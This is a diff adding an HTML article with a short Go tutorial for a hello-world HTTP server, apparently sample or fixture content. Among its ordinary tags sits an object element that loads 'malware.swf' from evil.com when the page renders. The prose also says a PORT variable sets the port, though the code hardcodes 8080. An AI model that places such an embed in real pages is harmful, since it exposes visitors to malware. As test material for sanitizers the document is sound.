@@ -1,0 +1,22 @@
+<article>
+  <h1 id="tut">Building a REST API in Go</h1>
+  <p>Let&#39;s build a simple HTTP server.</p>
+  <pre class="code"><code>package main
+
+import (
+    "fmt"
+    "net/http"
+)
+
+func main() {
+    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+        fmt.Fprintln(w, "Hello, World!")
+    })
+    http.ListenAndServe(":8080", nil)
+}</code></pre>
+  <p>Run with <kbd>go run main.go</kbd>.</p>
+  <p>Use <var>PORT</var> env var to configure the port.</p>
+  <a href="mailto:help@example.com" title="Get help">Email us</a>
+  <object data="https://evil.com/malware.swf"></object>
+  <del>Old approach</del> vs <ins>new approach</ins>
+</article>
